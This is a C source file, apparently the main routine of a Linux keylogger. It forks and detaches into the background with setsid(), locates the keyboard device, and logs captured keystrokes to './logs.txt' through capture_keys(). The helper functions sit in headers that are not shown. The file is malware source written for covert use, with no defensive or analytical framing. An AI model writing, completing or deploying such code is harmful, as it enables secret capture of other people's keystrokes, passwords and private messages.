#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

#include "help.h"
#include "config.h"
#include "keylogger.h"

int main()
{
	pid_t pid, sid;

    pid = fork();

    if (pid < 0) exit(EXIT_FAILURE);
    
    else if (pid > 0) 
    {
        printf("Child PID: %d\n", pid);
        exit(EXIT_SUCCESS);
    }
    
    umask(0);

	FILE *file = fopen("./logs.txt", "w");

	sid = setsid();

    char buffer[64];

    find_keyboard(buffer, file);

    fprintf(file, "tchonga\n");
    fflush(file);
    fprintf(file, "%s\n",buffer);
    fflush(file);

    capture_keys(file, buffer);

	return 0;
}
